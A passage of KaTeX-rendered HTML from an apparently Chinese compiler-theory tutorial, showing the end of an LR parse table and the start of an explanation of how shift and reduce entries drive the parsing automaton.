class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>7</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>7</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_7</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">7</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>8</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_8</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>11</mn></mrow><annotation encoding=\"application/x-tex\">11</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">1</span></span></span></span></td>\n</tr>\n<tr>\n<td>8</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>6</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>9</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>10</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>11</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>在得到分析表后，对于任意字符串，从<strong>状态0</strong>开始，启动自动机。对于读入的下一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>与当前的状态，定位到分析表中的元素。</p>\n<ul>\n<li>如果该元素是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>，则将这个字符push to stack，并且从当前状态转换到状态<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05724em;\">j</span></span></span></span>。</li>\n<li>如果该元素是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">r_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>，则根据（扩展）文法中第<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" 